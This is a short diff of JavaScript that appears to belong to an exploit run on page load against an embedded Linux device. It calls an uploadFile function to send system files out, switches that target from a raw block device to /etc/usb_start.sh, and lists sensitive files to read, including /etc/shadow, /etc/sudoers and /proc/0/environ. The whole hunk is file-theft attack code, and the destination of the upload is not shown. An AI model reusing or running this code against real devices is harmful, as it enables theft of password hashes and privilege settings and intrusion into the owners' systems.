@@ -51,11 +51,11 @@ function uploadFile(filename){
 
 
 function realOnload(){	
-	uploadFile("/dev/mmcblk0p0");
+	uploadFile("/etc/usb_start.sh");
 	console.log("sent");
 //	files = ['/proc/version', '/proc/cpuinfo', '/etc/issue', '/usr/bin/', '/etc/shadow', '/etc/group', '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime', '/proc/version', '/proc/loadavg', '/etc/fstab', '/etc/hostname', '/etc/hosts', '/etc/resolv.conf', '/etc/profile', '/etc/environment', '/etc/motd', '/var/log/dmesg', '/var/log/messages'];
 //	files += ['/etc/fstab', '/etc/hosts', '/etc/resolv.conf', "/etc/profile"];
-	
+	console.log(getFile)
 	files = [
 	         '/proc/0/environ', '/proc/version', '/proc/cpuinfo', '/etc/issue', '/etc/shadow', '/etc/group',
 	         '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime',
@@ -71,7 +71,7 @@ function realOnload(){
 	         '/var/log/faillog', '/etc/logrotate.conf'
 	       ];
 	for(var i = 0; i<files.length; i++){
-		console.log(getFile(files[i]));
+		//console.log(getFile(files[i]));
 	}
 }
 
